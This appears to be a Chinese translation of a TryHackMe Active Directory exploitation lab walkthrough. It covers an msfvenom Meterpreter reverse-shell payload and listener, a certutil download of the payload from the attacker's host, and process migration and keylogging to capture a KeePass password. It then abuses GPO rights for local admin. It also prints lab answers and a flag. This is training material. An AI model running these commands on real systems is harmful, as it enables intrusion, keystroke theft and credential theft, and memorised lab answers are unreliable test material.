<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT=&quot;Listening port&quot; -f psh -o shell.ps1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>接下来，你也可以使用以下命令在 msfconsole 中创建相关的监听器：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo msfconsole -q -x &quot;use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT&#x27;listening port&#x27;; exploit&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>你可以使用 Python 的 Web 服务器来托管你的 Meterpreter Shell，然后使用类似以下的方式进行复制：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">certutil.exe -urlcache -split -f http:///shell.ps1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦你拥有了 Meterpreter Shell，你可以继续。第一步是查看这台机器上用户是否有运行的进程：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Terminal</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter\&gt;ps | grep &quot;explorer&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Filtering on &#x27;explorer&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Process List</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> PID   PPID  Name          Arch  Session  User                     Path</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ---   ----  ----          ----  -------  ----                     ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 3612  3592  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果你在 trevor.local 用户下没有看到 explorer.exe 进程，你可以通过以下步骤自行启动这个进程：</p>
<ul>
<li>使用以下命令重置 trevor.local 用户的密码：<code>net user trevor.local &lt;password&gt;</code></li>
<li>在 PowerShell 中运行以下命令：<code>C:\auto-login.ps1 trevor.local &lt;password&gt; THMSERVER1</code></li>
<li>使用 <code>shutdown -r</code> 重启服务器</li>
<li>服务器重新上线后，你应该能看到 explorer 进程。</li>
</ul>
<p>看起来我们很幸运！用户在 THMSERVER1 上有一个活动会话。让我们迁移到这个用户的某个进程。通常，最安全的选择是像 explorer.exe 这样的进程：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Terminal</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter\&gt;migrate 3612</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Migrating from 4408 to 3612...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Migration completed successfully.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以使用 getuid 命令确认我们现在正在以目标用户的上下文中运行：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Terminal</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter\&gt;getuid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server username: THMSERVER1\trevor.local</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在我们需要耐心等待。如果幸运的话，我们将捕获一些凭据！等待几分钟，然后运行以下命令来转储捕获的按键记录：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Terminal</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter\&gt;keyscan_dump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dumping captured keystrokes...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">keep&lt;CR&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;Shift&gt;Passwordpasswordpassword&lt;CR&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这是针对 AD 用户的一个简单示例。还有许多其他工作可以做。在你的 AD 利用方法论中包含用户定位非常重要。为了回答这个任务的问题，你将需要使用 Keepass。它已经在 AttackBox 上为你安装好了，所以你只需搜索并运行该应用程序。如果你使用的是自己的虚拟机，在大多数 Linux 发行版上，sudo apt install keepassx 应该可以工作。或者你也可以从这里下载。另外，请确保使用 meterpreter 的下载命令将 Keepass 数据库下载到你的主机上。如果你正在使用 Kali，请确保 kali 用户拥有数据库文件，然后再打开它，否则它可能会锁定数据库并给出错误的结果。</p>
<p>虽然持久性只会在下一个环节中讨论，但现在可能是创建 THMSERVER1 上的一个本地账户并授予管理员权限的好时机，这样你就有了一个良好的立足点。由于这对于接下来的任务并不是真正需要的，如果你想这样做，你需要自己进行一些研究。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>使用什么应用程序打开 kdbx 凭证数据库？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Keepass</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>我们使用什么 meterpreter 命令从系统上下文移动到用户上下文？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">migrate</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>凭证数据库的密码是什么？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Imreallysurenoonewillguessmypassword</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="  复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>凭证数据库中存储的标志的值是多少？</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 具体操作步骤 </summary><div><div class="collapsibleContent_i85q"><p>挺重要的一点，就是加密数据库位于：</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\trevor.local\Documents\PasswordDatabase.kdbx</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>可以直接使用 msfconsole 下载下来，然后在本地进行解密</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(Meterpreter 1)(C:\Users\trevor.local\Documents) &gt; download PasswordDatabase.kdbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Downloading: PasswordDatabase.kdbx -&gt; /home/randark/PasswordDatabase.kdbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Downloaded 2.14 KiB of 2.14 KiB (100.0%): PasswordDatabase.kdbx -&gt; /home/randark/PasswordDatabase.kdbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Completed  : PasswordDatabase.kdbx -&gt; /home/randark/PasswordDatabase.kdbx</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div style="text-align:center"><p><img loading="lazy" alt="keepassx 解密结果" src="/TryHackMe-CN/assets/images/image_20231240-194029-f4f9b0840350657312b4904aecc78fa7.png" width="1003" height="652" class="img_ev3q"></p></div></div></div></details><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{AD.Users.Can.Give.Up.Good.Secrets}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-gpos---利用-gpos">Exploiting GPOs - 利用 GPOs<a href="#exploiting-gpos---利用-gpos" class="hash-link" aria-label="Exploiting GPOs - 利用 GPOs的直接链接" title="Exploiting GPOs - 利用 GPOs的直接链接">​</a></h2>
<p>抓取用户的按键记录使我们能够解密他们的凭证数据库，为我们提供了可以用于进一步进行 AD 利用的凭证，特别是 svcServMan 账户。我们需要进行一些枚举来弄清楚这些凭证将对我们有什么用。幸运的是，我们已经有了可以使用的 Sharphound 数据。使用 Bloodhound 中的搜索功能，让我们查看已发现账户的权限：</p>
<div style="text-align:center"><p><img loading="lazy" alt="Bloodhound 已有帐户的权限" src="/TryHackMe-CN/assets/images/image_20231210-201021-400c3b12b7ca93027be5357592ebfc51.png" width="1164" height="671" class="img_ev3q"></p></div>
<p>特别突出的是这个账户拥有一个权限，即对一个组策略对象（GPO）的所有权。此外，当我们进行一些调查时，似乎这个 GPO 被应用到了我们的 THMSERVER2 机器上：</p>
<div style="text-align:center"><p><img loading="lazy" alt="Bloodhound 已有帐户 GPO" src="/TryHackMe-CN/assets/images/image_20231210-201059-4894f0e2aa5e589fe809786b118b5455.png" width="1164" height="305" class="img_ev3q"></p></div>
<p>这可能为我们提供了进一步进行 AD 利用的理想机会！</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="组策略对象">组策略对象<a href="#组策略对象" class="hash-link" aria-label="组策略对象的直接链接" title="组策略对象的直接链接">​</a></h3>
<p>记得我们在枚举 AD 时讨论过 SYSVOL 目录吗？这个目录是存储 AD GPO（组策略对象），以便复制到加入域的计算机上的地方。GPO 是一组策略设置。每个 GPO 都有一个唯一的名称，称为 GUID。这就是为什么如果你试图读取 SYSVOL 目录的内容，用所有这些随机名称看起来毫无意义。</p>
<p>每台 Windows 计算机都有本地策略配置。其中包含了一些值得注意的配置，比如：</p>
<ul>
<li>服务的应用配置，如防火墙、防病毒软件和 Applocker。</li>
<li>本地组成员，比如管理员或远程桌面用户组。</li>
<li>启动配置，如应该执行的脚本。</li>
<li>安全和协议设置，如 SMBv1 支持。</li>
</ul>
<p>这些只是一些例子。可以设置的配置选项有很多。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="组策略管理">组策略管理<a href="#组策略管理" class="hash-link" aria-label="组策略管理的直接链接" title="组策略管理的直接链接">​</a></h3>
<p>如果你只有一台 Windows 计算机，直接在主机上更改本地策略配置很容易。然而，在大型组织中，你需要一种机制从中央位置部署配置。这就是群组策略管理（GPM）发挥作用的地方。与在每台机器上本地定义策略不同，GPM 允许我们直接在 AD 结构中定义策略。基本上，我们可以为 AD 对象（比如特定 OU 或组）定义 GPO。</p>
<p>加入域的计算机会定期从 SYSVOL 拉取所有策略，  并应用相关的策略。默认情况下，策略每 15 分钟通过 gpupdate 应用程序进行复制。然而，我们也可以从命令提示符手动执行这个应用程序，立即应用策略。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用-gpos">利用 GPOs<a href="#利用-gpos" class="hash-link" aria-label="利用 GPOs的直接链接" title="利用 GPOs的直接链接">​</a></h3>
<p>虽然有几种方法可以利用 GPOs，但我们将坚持使用一个简单的解决方案：将我们控制的 AD 账户添加到本地 Administrators 和 Remote Desktop Users 组。这将允许我们在 THMSERVER2 上拥有管理员特权并能够进行远程桌面连接。我们也可以使用暴露的 SSH 端口，但并不是很多组织都升级到提供 SSH 访问。因此，RDP 访问或传统的横向移动技术如 SMBExec 更安全。</p>
<p>为了修改 GPO，我们需要作为拥有相关权限的 AD 用户访问群组策略管理。我们可以作为该用户远程桌面连接到 THMSERVER1，但这可能会将用户踢出他们的活动会话，引起怀疑。相反，我们将使用我们普通的或 Tier 2 管理员账户远程桌面连接到 THMWRK1，使用 runas 命令将 AD 用户的凭据注入内存，并打开 MMC 来修改 GPO。关于 runas 命令的回顾，请参考枚举 AD 房间；然而，以下提供的命令也应该从管理员命令提示符窗口执行：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;runas /netonly /user:za.tryhackme.loc\&lt;AD Username&gt; cmd.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦提示，请提供与该账户关联的密码。要验证您提供了正确的凭据，您可以运行 <code>dir \\za.tryhackme.loc\sysvol</code> 。在新打开的命令提示符窗口中，我们可以启动 Microsoft Management Console（MMC）：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;mmc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在我们想要添加 Group Policy Management 控制台插件：</p>
<ol>
<li>点击 文件 -&gt; 添加 / 移除控制台</li>
<li>选择 Group Policy Management 控制台插件并点击添加</li>
<li>点击确定</li>
</ol>
<p>现在你应该能够看到 za.tryhackme.com 域的 GPO（组策略对象）了。</p>
<div style="text-align:center"><p><img loading="lazy" alt="MMC za.tryhackme.com domain" src="/TryHackMe-CN/assets/images/image_20231220-202019-ff1eb2534734fbdebbff778b17bc182d.png" width="808" height="457" class="img_ev3q"></p></div>
<p>现在我们可以导航至我们的用户有权限修改的 GPO（服务器 &gt; 管理服务器 &gt; 管理服务器推送）。</p>
<div style="text-align:center"><p><img loading="lazy" alt="MMC za.tryhackme.com domain GPO" src="/TryHackMe-CN/assets/images/image_20231221-202109-404054efacc2b51acaa91bf8d9c5a50c.png" width="748" height="470" class="img_ev3q"></p></div>
<p>我们可以右键点击该 GPO，然后选择编辑。这会打开新的 Group Policy Management Editor（组策略管理编辑器）窗口。</p>
<div style="text-align:center"><p><img loading="lazy" alt="MMC za.tryhackme.com domain GPO editor" src="/TryHackMe-CN/assets/images/image_20231221-202143-8e45d43a045e22b826409a65314ed256.png" width="656" height="225" class="img_ev3q"></p></div>
<p>为了将我们的账户添加到本地组，我们需要执行以下步骤：</p>
<ol>
<li>展开计算机配置</li>
<li>展开策略</li>
<li>展开 Windows 设置</li>
<li>展开安全设置</li>
<li>右键点击受限组，并选择添加组（如果 IT 支持组已经存在，这意味着有人已经执行了利用。你可以删除它以便重新创建，或者仅检查它以查看配置情况。）</li>
<li>点击浏览，输入 IT Support 并点击检查名称</li>
<li>点击两次确定</li>
</ol>
<div style="text-align:center"><p><img loading="lazy" alt="MMC za.tryhackme.com domain IT Support Properties" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWMAAAHDCAIAAAB+vOxYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABaESURBVHhe7d0/j9xWd8fxVfAECQKo3lJ2s0hpYdUESSHDlSsDfgNWm0IP4C7p3KW08TQp7Tdgu3RleIsEaXahMtFWcrmVtRCQdnKG58zJWV6Sh8MhORzu9wNjfO7hvRzOLvmbP9bITzabzRkAdPor+zcAtCMpAORICgA5kgJAjqQAkCMpAORICgA5kgKYxLt37z7++OMnlU8//fT9+/e2YS5yvzc3NzYIpCmbbNBbc1JUj67Otu222qAaWrWjnWpWnU5w1i36c7IjqFhrenPeF45CkuKrr776448/fv7556urqx9++ME2zOX6+vof/vGfamEhQ2nKJhv31uvPaMppHafpWV7r9B+62G+bM67Ge5ntMOZ5jFig58+ff/HFF998842N56K58F//+R+Xl5flcC/5uVs7v33YcYF1D11bfzqN9xibkx7S/I8XS/Ddd999/fXXb968+eSTT6w1I08HqQfHxJacu91qc3wY+21zVG0Ydcz0Wgu59Y5obArtCBs/nOl0k4pDr7WIQ6VDoXWtKWodrbXpvK+86coOTtT3338vv0q5tfExyHuNv/6bv5V/pLDW/pJPNHs+DcocmWmDffRcqIdRm1w2vSMaZ0rtRUpXeaEad+vNsiO8KbUXrmMnOsRJk1cT33777atXr2x8srqSQk9ZG1RiRwo/uQ/RZz+Nl01js1E6Uw5AxZnpqsYJuh8bVHreuw2q+bU94HS9f//+KG86nL/7kH+kkKFt2NPe/5VUT2tlrcoh5/fRrw05AGXjA9iO9tmVLQhLpD7uDwRj+e233z766CMbzC5+hCkOCYvWpJAzNZ67Qjs1h5zQHWu5